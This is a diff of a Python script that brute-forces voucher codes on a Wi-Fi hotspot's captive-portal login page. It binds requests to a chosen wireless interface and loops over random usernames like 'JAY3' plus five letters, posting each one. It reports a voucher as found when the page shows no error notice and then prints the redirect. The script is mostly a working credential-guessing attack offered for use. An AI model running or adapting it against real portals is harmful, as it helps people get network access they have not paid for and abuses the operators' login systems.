@@ -3,6 +3,7 @@
 # OpenSource2022 
 # Copyright By System╳
 #####################################################
+from string import printable as pt					#
 import string 										#
 import socket 										#
 import os                                           #
@@ -29,10 +30,6 @@ N = "\033[0m"                                       #
 NI = "\033[0;3m"                                    #
 #####################################################
 
-
-
-# def Invalid_Voucher():
-            
         
 
 class HTTPAdapterWithSocketOptions(requests.adapters.HTTPAdapter):
@@ -44,45 +41,81 @@ class HTTPAdapterWithSocketOptions(requests.adapters.HTTPAdapter):
         if self.socket_options is not None:
             kwargs["socket_options"] = self.socket_options
         super(HTTPAdapterWithSocketOptions, self).init_poolmanager(*args, **kwargs)
+def inputing(url,interface= "wlan0"):
+    url = 'http://'+url
+    interface = interface
+    adapter = HTTPAdapterWithSocketOptions(socket_options=[(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode('utf-8'))])
+    session = requests.session()
+    session.mount("http://", adapter)
+    session.mount("https://", adapter)
+    # url='http://192.168.90.29/getvoucher/index.php'
+	# def str(length=8):
+	#     text= string.ascii_letters
+	#     return ''.join(random.choice(text)for i in range(length))
+    i = 0
+    while 1:        
+        text= string.ascii_letters
+        txt = ''.join(random.choice (text)for i in range(5))
+        num= random.randrange(3,6)
+        generated = "JAY3{}".format(txt)
+        # generated = "JAY3AbCdE"
+        data= {
+			"username" : generated,
+			# "submit" : "LOGIN"
+			"dst" : " ",
+			"popup" : "true"
+		}
+        i += 1
+        r= session.post(url, data=data)
+        Soup = BeautifulSoup(r.text, 'html.parser')
+        print(YI+'Trying'+G+' ==> '+W+'['+N+' {} '.format(generated) +W+']' +W+' ['+B+ '{}'.format(i)+ '' +W+']'+N)
+        info = Soup.find('div', class_=["notice"])
+        try:
+            if info:
+                continue
+            else:
+                Rdr= requests.get(url)
+                print (G+'The Voucher is '+W+'['+G+' {} '.format(generated)+W+']'+N)
+                print (G+'REDIRECTED TO '+Y+'==> '+YI+'{}'.format(Rdr.url) + '' +N)
+                break
+        except AttributeError:
+            info = Soup.find('div', class_=["notice"])
+            print(info)
+            if info:
+                continue
+        except requests.exceptions.ConnectionError:
+            print(NI+'░░░▒▒▒▓▓▓███'+YI+'[ Estabilishing connection ]'+NI+'███▓▓▓▒▒▒░░░'+N)
+            time.sleep(0.2)
+        except KeyboardInterrupt:
+            sys.exit()
+if __name__=='__main__':
+    url=input("enter URL/IP: ")
+    print ("""
+       
+	Interface Default is [ wlan0 ]
+	just enter if you using default settings
 
-interface = 'wlan1'
-adapter = HTTPAdapterWithSocketOptions(socket_options=[(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode('utf-8'))])
-session = requests.session()
-session.mount("http://", adapter)
-session.mount("https://", adapter)
-
-
-def str(length=8):
-    text= string.ascii_letters
-    return ''.join(random.choice(text)for i in range(length))
-while 1:        
-    txt=str(4)    
-    num= random.randrange(3,6)
-    generated = "JAY{}{}".format(num,txt)
-    data= {
-        "username" : generated
-        # "dst" : ""
-        # "popup" : "true"
-    }
-    r= session.post('http://jay.net/login', params=data)
-    Soup = BeautifulSoup(r.text, 'html.parser')
-    print("Trying ==> {}".format(data))
+	""")
+    interface=input("Interface: ")
     try:
-	    Try_findText = Soup.find('div', class_="notice").text
-	    if Try_findText:
-	        continue
-    except requests.exceptions.ConnectionError:
-        '''
-        if the connection error, or perhaps no internet connection 
-        this function IDK why, if this function running it will be skip number of wordlist
+      inputing(url, interface)   
+    except KeyboardInterrupt:
+        sys.exit()
+    
 
-        '''
-        print(NI+'░░░▒▒▒▓▓▓███'+YI+'[ Estabilishing connection ]'+NI+'███▓▓▓▒▒▒░░░'+N)
-        time.sleep(0.2)
-        continue
-    else:
-	    break
-    print ("The Voucher is{}".format(data))
+
+
+
+
+
+
+
+
+
+
+
+
+
 # for i in range(100):
     
 
